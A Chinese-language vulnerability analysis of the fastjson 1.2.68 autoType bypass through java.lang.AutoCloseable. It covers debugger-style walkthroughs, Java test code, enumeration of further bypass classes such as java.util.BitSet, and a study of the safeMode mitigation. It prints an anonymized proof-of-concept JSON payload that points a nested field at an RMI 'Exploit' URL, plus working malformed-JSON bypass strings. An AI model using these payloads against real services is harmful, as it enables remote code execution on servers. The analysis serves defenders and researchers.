version="1.0" encoding="utf-8"?

# fastjson1.2.68绕过autotype反序列化攻击漏洞分析报告

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU1NzcxNjAyMQ==&mid=2247483844&idx=1&sn=d17cf341271f2a7132c353b9eb0aef76&chksm=fc30c69ecb474f885ca3e940a0be8a2cd94a937b231f024535897aaf436e4078ae84bdd7828b&scene=126&sessionid=1681400529#rd](http://mp.weixin.qq.com/s?__biz=MzU1NzcxNjAyMQ==&mid=2247483844&idx=1&sn=d17cf341271f2a7132c353b9eb0aef76&chksm=fc30c69ecb474f885ca3e940a0be8a2cd94a937b231f024535897aaf436e4078ae84bdd7828b&scene=126&sessionid=1681400529#rd)

## 【**背景**】

## fastjson自从1.2.25版本开始，进一步添加了配置项setAutoTypeSupport以及白名单，进一步限制@type的使用，默认该配置项关闭。配置项关闭时，在未指定目标类的情况下，只允许白名单内的类通过@type指定。

官方期望结果就是如果不显式调用setAutoTypeSupport(true)就无法完成反序列化攻击。但setAutoTypeSupport在1.2.48之前存在过绕过方式，即不需要setAutoTypeSupport为true，只需要先传入如下JSON进行反序列化：{"@type":"java.lang.Class", "val":"com.sun.rowset.JdbcRowSetImpl"}之后原来在黑名单中的类com.sun.rowset.JdbcRowSetImpl就会被加到白名单里。该BUG在1.2.48被修复，这是第一次绕过。这次通过java.lang.AutoCloseable实现的绕过，是第二次。出于对漏洞发现者知识产权的尊重，文中的POC匿名化处理。

## 【**原理分析**】

## 分析fastjson之前，我们写一些测试代码获得一些直观的认知（下文所有代码都是使用fastjson 1.2.68版本）

测试工程中存在POJO类，其中User实现接口Person：

**package **fastjsonPoc;

public **interface **Person{

}

**public ****class** User **implements **Person {

    **private ****int **age;

    **private** String userName;

    **public** User() {

           System.***out***.println("User construct");

    }

    **public** String getUserName() {

            System.***out***.println("getUserName");

            **return **userName;

    }

    **public ****void** setUserName(String userName) {

            System.***out***.println("setUserName:" + userName);

            **this**.userName = userName;

    }

    **public ****int** getAge() {

            System.***out***.println("getAge");

            **return **age;

    }

    **public ****void** setAge(**int**age) {

            System.***out***.println("setAge:" + age);

            **this**.age = age;

    }

}

执行代码

String jsonstr = "{\\"@type\\":\\"fastjsonPoc.User\\",\\"age\\":24,\\"userName\\":\\"李四\\"}";

**try** {

    System.***out***.println(jsonstr);

JSONObject.*parseObject*(jsonstr);//未指定目标类

}**catch** (Exception e) {

System.***out***.println(e.getMessage());

}

输出

{"@type":"fastjsonPoc.User","age":24,"userName":"李四"}

autoType is not support.fastjsonPoc.User

User是我们自己实现的类，是不可能在fastjson的黑名单中的，也不会在白名单中。证明不在白名单也不在黑名单中的类，在不开启autotype并且不指定目标类时，反序列化失败。

 

但是，在指定目标类的时候，效果又不同了。将代码做如下修改并执行：

String jsonstr = "{\\"@type\\":\\"fastjsonPoc.User\\",\\"age\\":24,\\"userName\\":\\"李四\\"}";

**try** {

    System.***out***.println(jsonstr);

    JSONObject.*parseObject*(jsonstr, Person.**class**);

}**catch** (Exception e) {

    System.***out***.println(e.getMessage());

}

输出

{"@type":"fastjsonPoc.User","age":24,"userName":"李四"}

User construct

setAge:24

setUserName:李四

因此我们可以得出结论，**在指定目标类并且该目标类是当前类的父类或接口时，反序列化可以成功，这是很关键的一点。**  

但若使用java.lang.Object作为目标类，结果还是不行的

String jsonstr = "{\\"@type\\":\\"fastjsonPoc.User\\",\\"age\\":24,\\"userName\\":\\"李四\\"}";

**try** {

       System.***out***.println(jsonstr);

       JSONObject.*parseObject*(jsonstr, Object.**class**);

}**catch** (Exception e) {

       System.***out***.println(e.getMessage());

}

输出

{"@type":"fastjsonPoc.User","age":24,"userName":"李四"}

autoType is not support.fastjsonPoc.User

 

得到以上认知后，来看看新版本的POC：

{"abc": {"@type":"java.lang.AutoCloseable"

{"@type":"abc.xxxxxx.xxxxxx.xxxx.xxxxxxxxxxxxx","xxxxxxxx":{"@type":"xyz.xxxxxx.xxxxxx.xxxx.xxxxxxxxxx","xxxxx": {"xxxxxxxx":"rmi://127.0.0.1:9999/Exploit"}}}

}

这个POC的神奇之处就在于让原本未指定目标类的代码如JSONObject.parseObject(xxx),实现指定了目标类为java.lang.AutoCloseable，从而让java.lang.AutoCloseable不在黑名单的子类abc.xxxxxx.xxxxxx.xxxx.xxxxxxxxxxxxx执行反序列化，实现攻击。

 

从形状看，这个POC甚至不符合JSON格式，红色部分是符合JSON格式的。难道是这种奇异的格式导致的“指定目标类”？  

### **运行过程分析**

### **1.   通过checkAutoType检查**

#### 

调试POC进入DefaultJSONParser.parseObject函数，进入关键函数checkAutoType，

checkAutoType中关键逻辑，未指定反序列化目标类且不在白名单中的typeName，要想在不支持autotype时通过检查，主要有3处分支：TypeUtils.getClassFromMapping(typeName)、deserializers.findClass(typeName)和typeMapping.get(typeName)。

  

**1****、****TypeUtils****的****mapping**

这个mappings初始化如下，内置了很多类：

**private ****static ****void** addBaseClassMappings(){

        *mappings*.put("byte", **byte**.**class**);

        *mappings*.put("short", **short**.**class**);

        *mappings*.put("int", **int**.**class**);

        *mappings*.put("long", **long**.**class**);

        *mappings*.put("float", **float**.**class**);

        *mappings*.put("double", **double**.**class**);

        *mappings*.put("boolean", **boolean**.**class**);

        *mappings*.put("char", **char**.**class**);

        *mappings*.put("\[byte", **byte**\[\].**class**);

        *mappings*.put("\[short", **short**\[\].**class**);

        *mappings*.put("\[int", **int**\[\].**class**);

        *mappings*.put("\[long", **long**\[\].**class**);

        *mappings*.put("\[float", **float**\[\].**class**);

        *mappings*.put("\[double", **double**\[\].**class**);

        *mappings*.put("\[boolean", **boolean**\[\].**class**);

        *mappings*.put("\[char", **char**\[\].**class**);

        *mappings*.put("\[B", **byte**\[\].**class**);

        *mappings*.put("\[S", **short**\[\].**class**);

        *mappings*.put("\[I", **int**\[\].**class**);

        *mappings*.put("\[J", **long**\[\].**class**);

        *mappings*.put("\[F", **float**\[\].**class**);

        *mappings*.put("\[D", **double**\[\].**class**);

        *mappings*.put("\[C", **char**\[\].**class**);

        *mappings*.put("\[Z", **boolean**\[\].**class**);

        Class<?>\[\] classes = **new** Class\[\]{

                Object.**class**,

                java.lang.Cloneable.**class**,

                *loadClass*("java.lang.AutoCloseable"),//here

                java.lang.Exception.**class**,

                java.lang.RuntimeException.**class**,

                java.lang.IllegalAccessError.**class**,

               java.lang.IllegalAccessException.**class**,

               java.lang.IllegalArgumentException.**class**,

               java.lang.IllegalMonitorStateException.**class**,

               java.lang.IllegalStateException.**class**,

               java.lang.IllegalThreadStateException.**class**,

               java.lang.IndexOutOfBoundsException.**class**,

                java.lang.InstantiationError.**class**,

               java.lang.InstantiationException.**class**,

                java.lang.InternalError.**class**,

                java.lang.InterruptedException.**class**,

                java.lang.LinkageError.**class**,

               java.lang.NegativeArraySizeException.**class**,

                java.lang.NoClassDefFoundError.**class**,

                java.lang.NoSuchFieldError.**class**,

                java.lang.NoSuchFieldException.**class**,

                java.lang.NoSuchMethodError.**class**,

               java.lang.NoSuchMethodException.**class**,

                java.lang.NullPointerException.**class**,

               java.lang.NumberFormatException.**class**,

                java.lang.OutOfMemoryError.**class**,

                java.lang.SecurityException.**class**,

                java.lang.StackOverflowError.**class**,

               java.lang.StringIndexOutOfBoundsException.**class**,

               java.lang.TypeNotPresentException.**class**,

                java.lang.VerifyError.**class**,

                java.lang.StackTraceElement.**class**,

                java.util.HashMap.**class**,

                java.util.Hashtable.**class**,

                java.util.TreeMap.**class**,

                java.util.IdentityHashMap.**class**,

                java.util.WeakHashMap.**class**,

                java.util.LinkedHashMap.**class**,

                java.util.HashSet.**class**,

                java.util.LinkedHashSet.**class**,

                java.util.TreeSet.**class**,

                java.util.ArrayList.**class**,

                java.util.concurrent.TimeUnit.**class**,

               java.util.concurrent.ConcurrentHashMap.**class**,

               java.util.concurrent.atomic.AtomicInteger.**class**,

               java.util.concurrent.atomic.AtomicLong.**class**,

                java.util.Collections.***EMPTY\_MAP***.getClass(),

                java.lang.Boolean.**class**,

                java.lang.Character.**class**,

                java.lang.Byte.**class**,

                java.lang.Short.**class**,

                java.lang.Integer.**class**,

                java.lang.Long.**class**,

                java.lang.Float.**class**,

                java.lang.Double.**class**,

                java.lang.Number.**class**,

                java.lang.String.**class**,

                java.math.BigDecimal.**class**,

                java.math.BigInteger.**class**,

                java.util.BitSet.**class**,

                java.util.Calendar.**class**,

                java.util.Date.**class**,

                java.util.Locale.**class**,

                java.util.UUID.**class**,

                java.sql.Time.**class**,

                java.sql.Date.**class**,

                java.sql.Timestamp.**class**,

                java.text.SimpleDateFormat.**class**,

               com.alibaba.fastjson.JSONObject.**class**,

               com.alibaba.fastjson.JSONPObject.**class**,

                com.alibaba.fastjson.JSONArray.**class**,

        };

        **for**(Class clazz : classes){

            **if**(clazz == **null**){

                **continue**;

            }

            *mappings*.put(clazz.getName(), clazz);

        }

}

**2****、****ParserConfig.deserializers**

默认初始化如下

**private ****void** initDeserializers() {

        deserializers.put(SimpleDateFormat.**class**, MiscCodec.***instance***);

        deserializers.put(java.sql.Timestamp.**class**, SqlDateDeserializer.***instance\_timestamp***);

        deserializers.put(java.sql.Date.**class**, SqlDateDeserializer.***instance***);

        deserializers.put(java.sql.Time.**class**, TimeDeserializer.***instance***);

        deserializers.put(java.util.Date.**class**, DateCodec.***instance***);

        deserializers.put(Calendar.**class**, CalendarCodec.***instance***);

        deserializers.put(XMLGregorianCalendar.**class**, CalendarCodec.***instance***);

 

        deserializers.put(JSONObject.**class**, MapDeserializer.*instance*);

        deserializers.put(JSONArray.**class**, CollectionCodec.***instance***);

 

        deserializers.put(Map.**class**, MapDeserializer.*instance*);

        deserializers.put(HashMap.**class**, MapDeserializer.*instance*);

        deserializers.put(LinkedHashMap.**class**, MapDeserializer.*instance*);

        deserializers.put(TreeMap.**class**, MapDeserializer.*instance*);

        deserializers.put(ConcurrentMap.**class**, MapDeserializer.*instance*);

        deserializers.put(ConcurrentHashMap.**class**, MapDeserializer.*instance*);

 

        deserializers.put(Collection.**class**, CollectionCodec.***instance***);

        deserializers.put(List.**class**, CollectionCodec.***instance***);

        deserializers.put(ArrayList.**class**, CollectionCodec.***instance***);

 

        deserializers.put(Object.**class**, JavaObjectDeserializer.***instance***);

        deserializers.put(String.**class**, StringCodec.*instance*);

        deserializers.put(StringBuffer.**class**, StringCodec.*instance*);

        deserializers.put(StringBuilder.**class**, StringCodec.*instance*);

        deserializers.put(**char**.**class**, CharacterCodec.***instance***);

        deserializers.put(Character.**class**, CharacterCodec.***instance***);

        deserializers.put(**byte**.**class**, NumberDeserializer.***instance***);

        deserializers.put(Byte.**class**, NumberDeserializer.***instance***);

        deserializers.put(**short**.**class**, NumberDeserializer.***instance***);

        deserializers.put(Short.**class**, NumberDeserializer.***instance***);

        deserializers.put(**int**.**class**, IntegerCodec.*instance*);

        deserializers.put(Integer.**class**, IntegerCodec.*instance*);

        deserializers.put(**long**.**class**, LongCodec.*instance*);

        deserializers.put(Long.**class**, LongCodec.*instance*);

        deserializers.put(BigInteger.**class**, BigIntegerCodec.***instance***);

        deserializers.put(BigDecimal.**class**, BigDecimalCodec.***instance***);

        deserializers.put(**float**.**class**, FloatCodec.*instance*);

        deserializers.put(Float.**class**, FloatCodec.*instance*);

        deserializers.put(**double**.**class**, NumberDeserializer.***instance***);

        deserializers.put(Double.**class**, NumberDeserializer.***instance***);

        deserializers.put(**boolean**.**class**, BooleanCodec.***instance***);

        deserializers.put(Boolean.**class**, BooleanCodec.***instance***);

        deserializers.put(Class.**class**, MiscCodec.***instance***);

        deserializers.put(**char**\[\].**class**, **new** CharArrayCodec());

 

        deserializers.put(AtomicBoolean.**class**, BooleanCodec.***instance***);

        deserializers.put(AtomicInteger.**class**, IntegerCodec.*instance*);

        deserializers.put(AtomicLong.**class**, LongCodec.*instance*);

        deserializers.put(AtomicReference.**class**, ReferenceCodec.***instance***);

 

        deserializers.put(WeakReference.**class**, ReferenceCodec.***instance***);

        deserializers.put(SoftReference.**class**, ReferenceCodec.***instance***);

 

        deserializers.put(UUID.**class**, MiscCodec.***instance***);

        deserializers.put(TimeZone.**class**, MiscCodec.***instance***);

        deserializers.put(Locale.**class**, MiscCodec.***instance***);

        deserializers.put(Currency.**class**, MiscCodec.***instance***);

 

        deserializers.put(Inet4Address.**class**, MiscCodec.***instance***);

        deserializers.put(Inet6Address.**class**, MiscCodec.***instance***);

        deserializers.put(InetSocketAddress.**class**, MiscCodec.***instance***);

        deserializers.put(File.**class**, MiscCodec.***instance***);

        deserializers.put(URI.**class**, MiscCodec.***instance***);

        deserializers.put(URL.**class**, MiscCodec.***instance***);

        deserializers.put(Pattern.**class**, MiscCodec.***instance***);

        deserializers.put(Charset.**class**, MiscCodec.***instance***);

        deserializers.put(JSONPath.**class**, MiscCodec.***instance***);

        deserializers.put(Number.**class**, NumberDeserializer.***instance***);

        deserializers.put(AtomicIntegerArray.**class**, AtomicCodec.***instance***);

        deserializers.put(AtomicLongArray.**class**, AtomicCodec.***instance***);

        deserializers.put(StackTraceElement.**class**, StackTraceElementDeserializer.***instance***);

 

        deserializers.put(Serializable.**class**, JavaObjectDeserializer.***instance***);

        deserializers.put(Cloneable.**class**, JavaObjectDeserializer.***instance***);

        deserializers.put(Comparable.**class**, JavaObjectDeserializer.***instance***);

        deserializers.put(Closeable.**class**, JavaObjectDeserializer.***instance***);

 

        deserializers.put(JSONPObject.**class**, **new** JSONPDeserializer());

    }

**3****、****ParserConfig.typeMapping**

默认为NULL，用户可通过API添加

 

clazz由TypeUtils.*getClassFromMapping* (“java.lang. AutoCloseable”)查找得到

![](../Images/7b2d283c4df9cb858f00fafbf7feda6c.png)

![](../Images/13c87e59ec9d309390b4d73ea1f9ad63.png)**2.查找反序化器**

#### 

根据类型查找反序列化器，进入ParserConfig.getDeserializer，该函数存在大量的硬编码，仅截取3个片断说明

片断1

![](../Images/3223019ff2a88432aebdda91ae9dbb37.png)

片段2

![](../Images/c9d0eea4bc4a94fb915f7005add3ae7e.png)

片断3

![](../Images/d71b7c3ddf522afbf8809ab4aec6502c.png)

靠这种硬编码人工穷举而不是机制上统一的解决，非常容易出现遗漏，因为人脑总会犯错或存在考虑不到的点。最终也正是在此函数中出现问题：

![](../Images/9de70f5177eec64e9f06444a4d622bef.png)

在前面所有条件都不满足之后，会为clazz创建一个JavaBeanDeserializer。

POC调试的结果就是为java.lang.Autoclosable创建了一个ObjectDeserializer类型为JavaBeanDeserializer。这就是fastjson逻辑上的BUG，没有正确处理java.lang.Autoclosable反序化器问题，导致走入最后的else分支产生JavaBeanDeserializer。

到这里POC为什么是一串不正确的JSON字符串也解释得通了：

1{"abc": {"@type":"java.lang.AutoCloseable"

2{"@type":"abc.xxxxxx.xxxxxx.xxxx.xxxxxxxxxxxxx","xxxxxx":{"@type":"xyz.xxxxxx.xxxxxx.xxxx.xxxxxxxxxx","config": {"xxxxxxxxxxxxxxx":"rmi://127.0.0.1:9999/Exploit"}}}

3}

第一行数据{"abc": {"@type":"java.lang.AutoCloseable"读取并解析之后得到JavaBeanDeserializer反序列器，那么接下来的数据自然就要是一个Bean的正确序列化的JSON结构。

  

#### **3．执行反序列化**

进入JavaBeanDeserializer.deserialze，如下关键代码中typeName值即变为xyz.xxxxxx.xxxxxx.xxxx.xxxxxxxxxxxxx，getSeeAlso会返回null。然后进入获取并赋值expectClass分支，type值为java.lang.AutoClosable，然后进入checkAutoType、JavaBeanDeserializer.deserialze递归流程，直到反序列化结束。

 

到这里就实现了将java.lang.AutoClosable指定为目标类，根据上面得到的认知，Gadget链的第一个gadget只要满足是java.lang.AutoClosable接口的实现（子类）即可。

![](../Images/d5757140c88302f986a5f869bf1325f3.png)

后续查找gadget的事情就不讨论了，这个和漏洞成因没有关系。

### **举一反三**

本漏洞特征：

1、  默认autotype关闭能通过checkAutoType检查。即

TypeUtils.getClassFromMapping(typeName)、deserializers.findClass(typeName)和typeMapping.get(typeName)中有一个返回不为空

2、  查找返回的反序列化器ObjectDeserializer为JavaBeanDeserializer

3、  因为要满足特征2，POC格式也要写成特定格式，而不是正常的JSON串。

 

上面分析得知，TypeUtils.mapping和ParserConfig.deserializers内置了很多类，我们可以手工修改调用fastjson代码，遍历TypeUtils.mapping和ParserConfig.deserializers类调用ParserConfig.getDeserializer方法。如果返回的反序列化器是JavaBeanDeserializer，就是另外的可以绕过autoType的类。

 

写如下代码，完成查找

**static ****void** findOtherEnterClass()

    {

       Class<?>\[\] classes = **new** Class\[\]{

                Object.**class**,

                java.lang.Cloneable.**class**,

                //loadClass("java.lang.AutoCloseable"),//here

                java.lang.AutoCloseable.**class**,

                java.lang.Exception.**class**,

                java.lang.RuntimeException.**class**,

                java.lang.IllegalAccessError.**class**,

               java.lang.IllegalAccessException.**class**,

                java.lang.IllegalArgumentException.**class**,

               java.lang.IllegalMonitorStateException.**class**,

               java.lang.IllegalStateException.**class**,

               java.lang.IllegalThreadStateException.**class**,

                java.lang.IndexOutOfBoundsException.**class**,

                java.lang.InstantiationError.**class**,

               java.lang.InstantiationException.**class**,

                java.lang.InternalError.**class**,

                java.lang.InterruptedException.**class**,

                java.lang.LinkageError.**class**,

               java.lang.NegativeArraySizeException.**class**,

                java.lang.NoClassDefFoundError.**class**,

                java.lang.NoSuchFieldError.**class**,

                java.lang.NoSuchFieldException.**class**,

                java.lang.NoSuchMethodError.**class**,

               java.lang.NoSuchMethodException.**class**,

                java.lang.NullPointerException.**class**,

               java.lang.NumberFormatException.**class**,

                java.lang.OutOfMemoryError.**class**,

                java.lang.SecurityException.**class**,

                java.lang.StackOverflowError.**class**,

               java.lang.StringIndexOutOfBoundsException.**class**,

                java.lang.TypeNotPresentException.**class**,

                java.lang.VerifyError.**class**,

                java.lang.StackTraceElement.**class**,

                java.util.HashMap.**class**,

                java.util.Hashtable.**class**,

                java.util.TreeMap.**class**,

                java.util.IdentityHashMap.**class**,

                java.util.WeakHashMap.**class**,

                java.util.LinkedHashMap.**class**,

                java.util.HashSet.**class**,

                java.util.LinkedHashSet.**class**,

                java.util.TreeSet.**class**,

                java.util.ArrayList.**class**,

                java.util.concurrent.TimeUnit.**class**,

               java.util.concurrent.ConcurrentHashMap.**class**,

               java.util.concurrent.atomic.AtomicInteger.**class**,

                java.util.concurrent.atomic.AtomicLong.**class**,

                java.util.Collections.***EMPTY\_MAP***.getClass(),

                java.lang.Boolean.**class**,

                java.lang.Character.**class**,

                java.lang.Byte.**class**,

                java.lang.Short.**class**,

                java.lang.Integer.**class**,

                java.lang.Long.**class**,

                java.lang.Float.**class**,

                java.lang.Double.**class**,

                java.lang.Number.**class**,

                java.lang.String.**class**,

                java.math.BigDecimal.**class**,

                java.math.BigInteger.**class**,

                java.util.BitSet.**class**,

                java.util.Calendar.**class**,

                java.util.Date.**class**,

                java.util.Locale.**class**,

                java.util.UUID.**class**,

                java.sql.Time.**class**,

                java.sql.Date.**class**,

                java.sql.Timestamp.**class**,

                java.text.SimpleDateFormat.**class**,

               com.alibaba.fastjson.JSONObject.**class**,

                com.alibaba.fastjson.JSONPObject.**class**,

                com.alibaba.fastjson.JSONArray.**class**,

               

               

                //补充自deserializers

                SimpleDateFormat.**class**,

                java.sql.Timestamp.**class**,

                java.sql.Date.**class**,

                java.sql.Time.**class**,

                java.util.Date.**class**,

                Calendar.**class**,

                XMLGregorianCalendar.**class**,

                JSONObject.**class**,

                JSONArray.**class**,

 

                Map.**class**,

                HashMap.**class**,

                LinkedHashMap.**class**,

                TreeMap.**class**,

                ConcurrentMap.**class**,

                ConcurrentHashMap.**class**,

 

                Collection.**class**,

                List.**class**,

                ArrayList.**class**,

 

                Object.**class**,

                String.**class**,

                StringBuffer.**class**,

                StringBuilder.**class**,

                **char**.**class**,

                Character.**class**,

                **byte**.**class**,

                Byte.**class**,

                **short**.**class**,

                Short.**class**,

                **int**.**class**,

                Integer.**class**,

                **long**.**class**,

                Long.**class**,

                BigInteger.**class**,

                BigDecimal.**class**,

                **float**.**class**,

                Float.**class**,

                **double**.**class**,

                Double.**class**,

                **boolean**.**class**,

                Boolean.**class**,

                Class.**class**,

                **char**\[\].**class**,

 

                AtomicBoolean.**class**,

                AtomicInteger.**class**,

                AtomicLong.**class**,

                AtomicReference.**class**,

 

                WeakReference.**class**,

                SoftReference.**class**,

 

                UUID.**class**,

                TimeZone.**class**,

                Locale.**class**,

                Currency.**class**,

 

                Inet4Address.**class**,

                Inet6Address.**class**,

                InetSocketAddress.**class**,

                File.**class**,

                URI.**class**,

                URL.**class**,

                Pattern.**class**,

                Charset.**class**,

                JSONPath.**class**,

                Number.**class**,

                AtomicIntegerArray.**class**,

                AtomicLongArray.**class**,

                StackTraceElement.**class**,

 

                Serializable.**class**,

                Cloneable.**class**,

                Comparable.**class**,

                Closeable.**class**,

 

                JSONPObject.**class**

 

        };

      

        **for**(Class<?> clazz : classes)

        {

        **try** {     

        ObjectDeserializerdeserializer = ParserConfig.*getGlobalInstance*().getDeserializer(clazz);

           **if**(deserializer**instanceof**JavaBeanDeserializer)

           {

               System.***out***.println(clazz.getName());

           }

        }**catch** (Exception e) {

            //System.out.println(e.getMessage());

        }

        }

最终得到结果

**java.lang.AutoCloseable**

**java.lang.Exception**

**java.lang.RuntimeException**

**java.lang.IllegalAccessError**

**java.lang.IllegalAccessException**

**java.lang.IllegalArgumentException**

**java.lang.IllegalMonitorStateException**

**java.lang.IllegalStateException**

**java.lang.IllegalThre****adStateException**

**java.lang.IndexOutOfBoundsException**

**java.lang.InstantiationError**

**java.lang.InstantiationException**

**java.lang.InternalError**

**java.lang.InterruptedException**

**java.lang.LinkageError**

**java.lang.NegativeArraySizeException**

**java.lang.NoClassDefFoundError**

**java.lang.NoSuchFieldError**

**java.lang.NoSuchFieldException**

**java.lang.NoSuchMethodError**

**java.lang.NoSuchMethodException**

**java.lang.NullPointerException**

**java.lang.NumberFormatException**

**java.lang.OutOfMemoryError**

**java.lang.SecurityException**

**java.lang.StackOverflowError**

**java.lang.StringIndexOutOfBoundsException**

**java.lang.VerifyError**

**java.util.BitSet**

 

以上结果除了java.lang.AutoCloseable，大部分是异常类，还有java.util.BitSet。用java.util.BitSet来试一试。修改User类继承java.util.BitSet

**public ****class** User **extends** BitSet{

    **private ****int **age;

    **private** String userName;

    **public** User() {

           System.***out***.println("User construct");

    }

    **public** String getUserName() {

            System.***out***.println("getUserName");

            **return **userName;

    }

    **public ****void** setUserName(String userName) {

            System.***out***.println("setUserName:" + userName);

            **this**.userName = userName;

    }

    **public ****int** getAge() {

            System.***out***.println("getAge");

            **return **age;

    }

    **public ****void** setAge(**int**age) {

            System.***out***.println("setAge:" + age);

            **this**.age = age;

    }

}

执行代码

jsonstr = "{\\"a\\":{\\"@type\\":\\"java.util.BitSet\\"{\\"@type\\":\\"fastjsonPoc.User\\",\\"age\\":24,\\"userName\\":\\"李四\\"}}";

**try** {

    System.***out***.println(jsonstr);

    JSONObject.*parseObject*(jsonstr);

}**catch** (Exception e) {

    System.***out***.println(e.getMessage());

}

反序化成功

{"a":{"@type":"java.util.BitSet"{"@type":"fastjsonPoc.User","age":24,"userName":"李四"}}

Userconstruct

setAge:24

setUserName:李四

  

## **【****缓存措施研究****】**

如果设置safeMode，checkAutoType仍然可能会从红框内代码处返回。只有这一个地方能正常返回，设置目标类的方法已经无效了。

![](../Images/aad0cebca86e1ba13484e732ec9fd3cd.png)

  

那么红框处代码会不会存在问题？默认情况下，autoTypeCheckHandlers是null，除非用户调用ParserConfig.addAutoTypeCheckHandler手动添加。AutoTypeCheckHandler是一个接口：

**public ****interface** AutoTypeCheckHandler{

        Class<?> handler(String typeName, Class<?> expectClass, **int**features);

}

 

假设用户非常“聪明”的添加了autoTypeCheckHandler：

**package **fastjsonPoc;

 

**import **com.alibaba.fastjson.parser.ParserConfig.AutoTypeCheckHandler;

 

**public ****class** MyAutoTypeHandler **implements** AutoTypeCheckHandler {

    **private ****boolean **entered = **false**;

    **public** Class<?> handler(String typeName, Class<?> expectClass, **int**features) {

       // **TODO**Auto-generated method stub

       **if**(!entered)

       {

           entered = **true**;

           **return** AutoCloseable.**class**;

       }

          

       **return ****null**;

    }

}

此时令User实现AutoCloseable

**package**fastjsonPoc;

 

**public ****class** User **implements** AutoCloseable {

    **private ****int **age;

    **private** String userName;

    **public** User() {

           System.***out***.println("User construct");

    }

    **public** String getUserName() {

            System.***out***.println("getUserName");

            **return **userName;

    }

    **public ****void** setUserName(String userName) {

            System.***out***.println("setUserName:" + userName);

            **this**.userName = userName;

    }

    **public ****int** getAge() {

            System.***out***.println("getAge");

            **return **age;

    }

    **public ****void** setAge(**int**age) {

            System.***out***.println("setAge:" + age);

            **this**.age = age;

    }

   

    **public ****void** close() **throws** Exception {

       // **TODO**Auto-generated method stub

      

    }

}

 

执行如下代码

jsonstr = "{\\"a\\":{\\"@type\\":\\"java.lang.AutoCloseable\\"{\\"@type\\":\\"fastjsonPoc.User\\",\\"age\\":24,\\"userName\\":\\"李四\\"}}";

ParserConfig.*getGlobalInstance*().setSafeMode(**true**);

ParserConfig.*getGlobalInstance*().addAutoTypeCheckHandler(**new** MyAutoTypeHandler());

**try** {

System.***out***.println(jsonstr);

    JSONObject.*parseObject*(jsonstr);

}**catch** (Exception e) {

System.***out***.println(e.getMessage());

}

输出结果

safeMode not support autoType :fastjsonPoc.User

此时虽然反序列器可以非正常的返回JavaBeanDeserializer，JavaBeanDeserializer反序列化时仍然会调用checkAutoType，结合开头safemode代码可知，fastjsonPoc.User类会抛异常:

![](../Images/58b8007f59dd1cf4031d56711df0a1c7.png)

除非用户为gadget链上的每一个类型都调用addAutoTypeCheckHandler主动添加，显然这种事情发生的概率几乎为0。比如本例将User.class也添加返回，其他代码不变：

**package **fastjsonPoc;

 

**import **com.alibaba.fastjson.parser.ParserConfig.AutoTypeCheckHandler;

 

**public ****class** MyAutoTypeHandler **implements** AutoTypeCheckHandler {

    **private ****boolean **entered = **false**;

    **public** Class<?> handler(String typeName, Class<?> expectClass, **int**features) {

       **if**(!entered)

       {

           entered = **true**;

           **return** AutoCloseable.**class**;

       }

          

       **return** User.**class**;

    }

}

仍然执行如下

jsonstr = "{\\"a\\":{\\"@type\\":\\"java.lang.AutoCloseable\\"{\\"@type\\":\\"fastjsonPoc.User\\",\\"age\\":24,\\"userName\\":\\"李四\\"}}";

ParserConfig.*getGlobalInstance*().setSafeMode(**true**);

ParserConfig.*getGlobalInstance*().addAutoTypeCheckHandler(**new** MyAutoTypeHandler());

**try** {

    System.***out***.println(jsonstr);

JSONObject.*parseObject*(jsonstr);

}**catch** (Exception e) {

System.***out***.println(e.getMessage());

}

输出

{"a":{"@type":"java.lang.AutoCloseable"{"@type":"fastjsonPoc.User","age":24,"userName":"李四"}}

User construct

setAge:24

setUserName:李四

这样反序列才能成功。

## **【结语】**

1、java.lang.AutoCloseable类fastjson在查找反序列化器时存在BUG，导致返回JavaBeanDeserializer，会将后续的反序列化数据按照目标类为java.lang.AutoCloseable进行反序列化，只要gadget不在checkautotype的黑名单中，就可完成反序列化链。

2、设置safemode可以99%杜绝@type造成的反序列化攻击，除非用户自己失误乱写代码。从开发角度讲，如果想继续使用@type指定反序列化特性，可通过添加addAutoTypeCheckHandler来实现兼容性。